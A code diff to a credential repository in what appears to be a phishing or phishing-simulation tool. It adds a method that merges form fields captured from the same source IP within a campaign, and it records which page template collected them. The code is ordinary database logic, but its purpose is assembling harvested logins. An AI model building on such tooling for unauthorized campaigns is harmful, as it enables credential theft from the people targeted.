@@ -61,12 +61,31 @@ class CredentialRepository:
     def __init__(self, db: Database) -> None:
         self._db = db
 
+    def merge_by_ip(self, credential: Credential) -> Credential | None:
+        """Find the most recent credential from the same IP and merge fields into it."""
+        row = self._db.fetchone(
+            "SELECT * FROM credentials WHERE campaign_id = ? AND source_ip = ? "
+            "ORDER BY captured_at DESC LIMIT 1",
+            (credential.campaign_id, credential.source_ip),
+        )
+        if row is None:
+            return None
+
+        existing = self._row_to_credential(row)
+        existing.fields.update(credential.fields)
+        self._db.execute(
+            "UPDATE credentials SET fields_json = ? WHERE id = ?",
+            (json.dumps(existing.fields), existing.id),
+        )
+        return existing
+
     def save(self, credential: Credential) -> Credential:
         cursor = self._db.execute(
-            "INSERT INTO credentials (campaign_id, fields_json, source_ip, user_agent) "
-            "VALUES (?, ?, ?, ?)",
+            "INSERT INTO credentials (campaign_id, template, fields_json, source_ip, user_agent) "
+            "VALUES (?, ?, ?, ?, ?)",
             (
                 credential.campaign_id,
+                credential.template,
                 json.dumps(credential.fields),
                 credential.source_ip,
                 credential.user_agent,
@@ -98,6 +117,7 @@ class CredentialRepository:
         return Credential(
             id=row["id"],
             campaign_id=row["campaign_id"],
+            template=row["template"] if "template" in row.keys() else "",
             fields=json.loads(row["fields_json"]),
             source_ip=row["source_ip"],
             user_agent=row["user_agent"],
